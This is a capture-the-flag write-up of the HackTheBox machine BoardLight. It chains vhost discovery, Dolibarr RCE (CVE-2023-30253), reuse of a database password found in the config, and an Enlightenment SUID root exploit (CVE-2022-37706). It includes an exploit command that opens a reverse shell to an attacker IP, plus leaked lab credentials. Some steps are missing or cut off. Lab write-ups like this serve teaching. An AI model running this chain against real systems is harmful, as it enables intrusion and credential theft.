# 1. Reconnaissance

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV -oG Allports 10.129.231.37
```

The scan returns two open ports:

```text

80/tcp open http
```

# 2. Web Enumeration

I access the web server using the target IP.

Instead of displaying the expected page directly, the server redirects us to:

```text
board.htb
```

Therefore, we add the hostname to `/etc/hosts`:

```text
10.129.231.37 board.htb
```

This allows our machine to resolve:

```text
board.htb
```

to the target IP.

I then begin enumerating the web application.

At the same time, I enumerate possible virtual hosts using Gobuster:

```bash
gobuster vhost -u http://board.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100 --append-domain -r
```

The enumeration reveals an interesting subdomain:

```text
crm.board.htb
```

I add it to `/etc/hosts`:

```text
10.129.231.37 crm.board.htb
```

and access it through the browser.

# 3. Discovering Dolibarr

The `crm.board.htb` subdomain presents a login page for **Dolibarr**.

At this point, the application and its version become the main attack surface.

After researching vulnerabilities affecting the identified version of Dolibarr, I find:

```text
CVE-2023-30253
```

This vulnerability allows authenticated remote code execution in affected versions of Dolibarr.

The vulnerability is documented by the NVD:

```text
https://nvd.nist.gov/vuln/detail/cve-2023-30253
```

# 4. Exploiting CVE-2023-30253

We can exploit the vulnerability using a publicly available proof of concept.

The exploit is executed with the target URL, the Dolibarr credentials, our attacking IP, and the listening port:

```bash
python3 CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -r 10.10.15.194 4444
```

The exploit provides remote command execution on the target.

The RCE can also be verified by creating a page through the vulnerable functionality. The resulting shell runs with the privileges of the web server.

This gives us access as:

```text
www-data
```

# 6. Moving from www-data to Larissa

After discovering the password, I enumerate the local users to determine whether it belongs to an interactive account.

I check `/etc/passwd` for users with Bash as their login shell:

```bash

```

The `larissa` user has a Bash shell, making the account a potential SSH target.

Since SSH is exposed on port 22, I try the recovered password against `larissa`.


The credentials work, giving us an SSH session as:

# Vulnerabilities & Techniques

## Virtual Host Enumeration

The initial web server redirected to `board.htb`, after which virtual host enumeration revealed:

```text
crm.board.htb
```

This exposed a separate application that was not visible from the main website.

## Dolibarr Remote Code Execution

The CRM application was running Dolibarr and was vulnerable to:

```text
CVE-2023-30253
```

The vulnerability allowed authenticated remote code execution, providing the initial shell as:

```text
www-data
```

## Sensitive Configuration File Disclosure

The Dolibarr configuration file contained database credentials:

```text
dolibarr_main_db_user='dolibarrowner'
dolibarr_main_db_pass='serverfun2$2023!!'
```

Credentials stored in application configuration files can become dangerous when they are reused for other accounts.

## Credential Reuse

The discovered password could be reused against the `larissa` account, allowing us to move from the web server account to an interactive SSH user.

## SUID Binary Enumeration

LinPEAS revealed the following root-owned SUID binary:

```text
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
```

The SUID permission means the binary executes with the effective privileges of its owner, which in this case is `root`. You can also enumerate this searching por SUID permissions and searching on searchesploit

## CVE-2022-37706

The installed Enlightenment version was:

```text
0.23.1
```

The vulnerable SUID binary was affected by:

```text
CVE-2022-37706
```

Exploiting the vulnerability resulted in a root shell.

# Lessons Learned

BoardLight demonstrates the importance of following the attack surface from the external web application into the local operating system.

The initial Nmap scan only revealed SSH and HTTP, but virtual host enumeration exposed a second application:

```text
crm.board.htb
```

That application was running a vulnerable version of Dolibarr, allowing remote code execution.

After obtaining `www-data`, the Dolibarr configuration file provided database credentials. These credentials were then reused against the `larissa` system account, providing a stable SSH session.

The final escalation came from local enumeration. LinPEAS identified a root-owned SUID binary belonging to Enlightenment. Checking the installed version revealed that it was vulnerable to CVE-2022-37706.

The complete compromise therefore followed this chain:

```text
External Enumeration
    |
    v
Virtual Host Discovery
    |
    v
Dolibarr
    |
    v
CVE-2023-30253
    |
    v
www-data
    |
    v
Credentials in conf.php
    |
    v
larissa
    |
    v
SUID Enlightenment
    |
    v
CVE-2022-37706
    |
    v
root
```
